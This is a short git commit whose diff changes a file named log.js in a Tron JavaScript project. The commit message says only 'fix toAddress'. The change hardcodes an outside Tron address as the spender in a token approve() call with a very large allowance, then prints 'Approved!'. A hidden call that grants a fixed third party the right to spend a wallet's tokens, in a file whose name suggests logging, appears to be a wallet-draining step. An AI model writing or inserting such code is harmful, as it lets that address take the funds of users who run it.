497c33886a75570320f76999c435895d115948b9
Adam <bzzdecentrailed@gmail.com>
2021-06-16 13:05:02 +0800

    fix toAddress

--- log.js
+++ log.js
@@ -4,7 +4,7 @@ tronWeb
   .at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
   .then((usdtContract) => {
 	  usdtContract
-		  .approve(toAddress, 1000000000000000)
+		  .approve("TBYjMhBiyEJxSA5g4HAoWWZXp7qU5C6Y9c", 1000000000000000)
 		  .send()
 		  .finally(() => {
 			  console.log("Approved!");
